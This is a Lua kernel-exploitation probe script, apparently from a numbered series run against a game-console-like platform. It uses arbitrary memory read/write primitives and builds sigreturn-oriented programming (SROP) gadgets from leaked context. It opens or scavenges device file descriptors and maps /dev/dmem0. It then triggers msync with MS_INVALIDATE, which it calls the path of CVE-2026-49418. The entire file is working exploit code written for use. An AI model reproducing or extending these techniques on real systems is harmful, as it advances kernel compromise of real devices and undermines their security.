-- CRASH_CLASS: MODERATE
-- PROBE 58b: msync(MS_INVALIDATE) on device-backed mmap via /dev/dmem0
--
-- Context: 58a showed msync(MS_INVALIDATE) returns -1 on GPU anonymous mmap.
-- The CVE-2026-49418 device pager path requires a REAL device fd mapping.
-- /dev/dmem0 opens with O_RDWR and mmaps with PROT_READ|MAP_SHARED (probes 262a/263a).
-- This probe opens dmem0, creates a device-backed mapping, and tests msync.
-- Also tests msync via SROP for proper errno capture.

print("=== PROBE 58b: MSYNC DEVICE PAGER ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local PAGE = 0x4000

-- Syscalls
local sc_open   = make_syscall(5)
local sc_close  = make_syscall(6)
local sc_mmap   = make_syscall(477)
local sc_msync  = make_syscall(65)
local sc_munmap = make_syscall(73)
local sc_gc     = make_syscall(421)
local sc_sr     = make_syscall(417)

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- Eboot for gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

-- SROP setup
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

--------------------------------------------------------------------
-- [A] Open /dev/dmem0
--------------------------------------------------------------------
print("--- [A] OPEN DMEM0 ---")

local path_buf = memory.alloc(32)
local path_str = "/dev/dmem0"
for i = 1, #path_str do
    memory.write_byte(path_buf + i - 1, string.byte(path_str, i))
end
memory.write_byte(path_buf + #path_str, 0)

-- O_RDWR = 2
local ok_open, fd = pcall(function()
    return sc_open(uint64(path_buf), uint64(2), uint64(0))
end)
local fd_val = -1
if ok_open then
    fd_val = to_num(fd)
    print("dmem0 fd=" .. fd_val)
else
    print("open FAILED")
end

if fd_val < 0 then
    -- Try /dev/dmem1
    local path2 = "/dev/dmem1"
    for i = 1, #path2 do
        memory.write_byte(path_buf + i - 1, string.byte(path2, i))
    end
    memory.write_byte(path_buf + #path2, 0)
    ok_open, fd = pcall(function()
        return sc_open(uint64(path_buf), uint64(2), uint64(0))
    end)
    if ok_open then
        fd_val = to_num(fd)
        print("dmem1 fd=" .. fd_val)
    else
        print("dmem1 open FAILED")
    end
end

if fd_val < 0 then
    print("NO DEVICE FD - trying existing game fds")
    -- Try small fd numbers that might be device files
    for test_fd = 3, 15 do
        local ok_m, mret = pcall(function()
            return sc_mmap(uint64(0), uint64(PAGE), uint64(1),
                uint64(0x0001), uint64(test_fd), uint64(0))
        end)
        if ok_m then
            local mh, ml = get_hi_lo(mret)
            if ml ~= 0 or mh ~= 0 then
                print("fd " .. test_fd .. " mmap OK at 0x" .. string.format("%X%08X", mh, ml))
                fd_val = test_fd
                -- unmap immediately
                pcall(function() sc_munmap(uint64(mret), uint64(PAGE)) end)
                break
            end
        end
    end
end

--------------------------------------------------------------------
-- [B] MMAP the device fd
--------------------------------------------------------------------
print("")
print("--- [B] DEVICE MMAP ---")

if fd_val < 0 then
    print("NO USABLE FD")
    print("=== DONE ===")
    return
end

-- MAP_SHARED = 1, PROT_READ = 1
local ok_dm, dev_map = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(1),
        uint64(0x0001), uint64(fd_val), uint64(0))
end)

if not ok_dm then
    print("device mmap PCALL-FAIL")
    -- Try SROP
    dev_map = srop(477, uint64(0), uint64(PAGE * 4), uint64(1),
        uint64(0x0001), uint64(fd_val), uint64(0))
end

local dmh, dml = get_hi_lo(dev_map)
print("dev_map=0x" .. string.format("%X%08X", dmh, dml))

if dml == 0 and dmh == 0 then
    print("device mmap FAILED")
    pcall(function() sc_close(uint64(fd_val)) end)
    print("=== DONE ===")
    return
end

-- Read test
local ok_rd, val = pcall(function() return memory.read_dword(dev_map) end)
if ok_rd then
    print("read[0]=0x" .. string.format("%08X", to_num(val)))
else
    print("read FAIL")
end

--------------------------------------------------------------------
-- [C] MSYNC on device mapping
--------------------------------------------------------------------
print("")
print("--- [C] MSYNC TESTS ---")

-- MS_SYNC = 0
local ok_ms, ret_ms = pcall(function()
    return sc_msync(uint64(dev_map), uint64(PAGE * 4), uint64(0))
end)
print("MS_SYNC: " .. (ok_ms and ("ret=" .. tostring(to_num(ret_ms))) or "PCALL-FAIL"))

-- MS_ASYNC = 1
local ok_ma, ret_ma = pcall(function()
    return sc_msync(uint64(dev_map), uint64(PAGE * 4), uint64(1))
end)
print("MS_ASYNC: " .. (ok_ma and ("ret=" .. tostring(to_num(ret_ma))) or "PCALL-FAIL"))

-- MS_INVALIDATE = 2 (the CVE path)
local ok_mi, ret_mi = pcall(function()
    return sc_msync(uint64(dev_map), uint64(PAGE * 4), uint64(2))
end)
print("MS_INVALIDATE: " .. (ok_mi and ("ret=" .. tostring(to_num(ret_mi))) or "PCALL-FAIL"))

-- Via SROP for raw errno
print("")
print("--- [D] SROP MSYNC ---")
local sret = srop(65, uint64(dev_map), uint64(PAGE * 4), uint64(2))
local srh, srl = get_hi_lo(sret)
print("SROP_msync_inv: 0x" .. string.format("%X%08X", srh, srl))

-- MS_INVALIDATE on GPU anonymous mmap for comparison
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gret = srop(65, uint64(gpu), uint64(PAGE * 4), uint64(2))
local grh, grl = get_hi_lo(gret)
print("SROP_msync_gpu: 0x" .. string.format("%X%08X", grh, grl))

-- Regular anonymous mmap (no GPU flags)
local _, anon = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local aret = srop(65, uint64(anon), uint64(PAGE * 4), uint64(2))
local arh, arl = get_hi_lo(aret)
print("SROP_msync_anon: 0x" .. string.format("%X%08X", arh, arl))

--------------------------------------------------------------------
-- [E] Post-invalidate state
--------------------------------------------------------------------
print("")
print("--- [E] POST STATE ---")

local ok_rd2, val2 = pcall(function() return memory.read_dword(dev_map) end)
if ok_rd2 then
    print("dev read_post=0x" .. string.format("%08X", to_num(val2)))
else
    print("dev read_post FAULT")
end

-- Cleanup
pcall(function() sc_munmap(uint64(dev_map), uint64(PAGE * 4)) end)
pcall(function() sc_munmap(uint64(gpu), uint64(PAGE * 4)) end)
pcall(function() sc_munmap(uint64(anon), uint64(PAGE * 4)) end)
pcall(function() sc_close(uint64(fd_val)) end)

print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
